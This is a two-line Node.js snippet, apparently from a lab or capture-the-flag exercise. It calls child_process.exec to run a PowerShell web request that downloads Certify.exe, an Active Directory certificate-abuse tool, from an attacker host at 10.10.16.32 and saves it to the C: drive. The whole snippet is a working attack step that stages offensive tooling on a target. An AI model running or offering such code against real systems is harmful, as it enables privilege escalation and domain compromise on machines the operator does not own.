const p = require("child_process");
p.exec("powershell -c iwr http://10.10.16.32:8000/Certify.exe -outf c:\\certify.exe");